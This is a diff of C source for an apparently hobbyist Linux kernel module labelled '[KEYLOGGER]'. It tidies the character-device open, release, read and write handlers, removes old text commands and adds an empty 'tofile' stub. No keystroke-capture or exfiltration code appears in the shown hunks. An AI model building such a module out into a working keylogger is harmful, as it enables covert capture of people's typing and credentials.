@@ -57,10 +57,10 @@ void inplace_reverse(char * str)
 		// swap the values in the two given variables
 		// XXX: fails when a and b refer to same memory location
 #   define XOR_SWAP(a,b) do	  \
-		{ \
-			a ^= b; \
-			b ^= a; \
-			a ^= b; \
+		{                         \
+			a ^= b;                 \
+			b ^= a;                 \
+			a ^= b;                 \
 		} while (0)
 
 		// walk inwards from both ends of the string,
@@ -235,7 +235,7 @@ static int device_open(struct inode *inode, struct file *file)
 	{
 		return -EBUSY;
 	}
-//	++Device_Open;
+
 	is_dev_opened = true;
 	buff_Ptr = msg;
 	try_module_get(THIS_MODULE);
@@ -245,7 +245,7 @@ static int device_open(struct inode *inode, struct file *file)
 static int device_release(struct inode *inode, struct file *file)
 {
 	printk(KERN_ALERT "[KEYLOGGER] Releasing device.\n");
-//	--Device_Open;
+
 	is_dev_opened = false;
 	module_put(THIS_MODULE);
 	return 0;
@@ -255,7 +255,7 @@ static ssize_t device_read(struct file *filp,char __user * buff, size_t len, lof
 {
 	int bytes = 0;
 	// char c; // unused variable
-	int size = 0;
+	// int size = 0; // unused variable
 
 	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");
 	// TODO: Rewrite this function
@@ -264,36 +264,14 @@ static ssize_t device_read(struct file *filp,char __user * buff, size_t len, lof
 		output_once = false;
 		return 0;
 	}
-	printk(KERN_INFO "Get\n");
 
-	/* if(!is_fwd_dir) // if bakward */
-	/* { */
-	/* 	while (*buff_Ptr != '\0') // well, it is size */
-	/* 	{ */
-	/* 		++buff_Ptr; */
-	/* 		++size; */
-	/* 	} */
-	/* 	while (size != 0) */
-	/* 	{ */
-	/* 		--size; */
-	/* 		--buff_Ptr; */
+	while (*buff_Ptr)
+	{
+		put_user(*(buff_Ptr++), buff++);
+		--len;
+		++bytes;
+	}
 
-	/* 		put_user(*buff_Ptr, ++buff); */
-
-	/* 		--len; */
-	/* 		++bytes; */
-	/* 	} */
-	/* 	output_once = true; */
-	/* } */
-	/* else */
-	/* { */
-		while (*buff_Ptr)
-		{
-			put_user(*(buff_Ptr++), buff++);
-			--len;
-			++bytes;
-		}
-	/* } */
 	printk(KERN_INFO "Bytes read: %d\n", bytes - 1);
 	return bytes;
 }
@@ -309,45 +287,15 @@ static ssize_t device_write(struct file *filp, const char __user * buff, size_t 
 	{
 		get_user(new_msg[i], buff + i);
 	}
-	if ( str_cmp(new_msg,"delete"))
+
+	// TODO: add key: write a key to driver, after that u can read from it
+	if (str_cmp(new_msg, "tofile"))
 	{
-		delete_content();
-	}
-	else if (str_cmp(new_msg,"dir back"))
-	{
-		direction_backward();
-	}
-	else if (str_cmp(new_msg,"dir forward"))
-	{
-		direction_forward();
-	}
-	else if (str_cmp(new_msg, "reverse"))
-	{
-		inplace_reverse(msg);
-		/* if (is_fwd_dir) */
-		/* { */
-		/* 	direction_backward(); */
-		/* } */
-		/* else */
-		/* { */
-		/* 	direction_forward(); */
-		/* } */
+		// write to file and print it's address
 	}
 	else
 	{
-		deleted = false;
-
-		for (i = 0; i < BUF_LEN; i++)
-		{
-			get_user(msg[i], " ");
-		}
-
-		for (i = 0; i < len && i < BUF_LEN; i++)
-		{
-			get_user(msg[i], buff + i);
-		}
-
-		buff_Ptr = msg;
+		// do nothing
 	}
 	return i;
 }
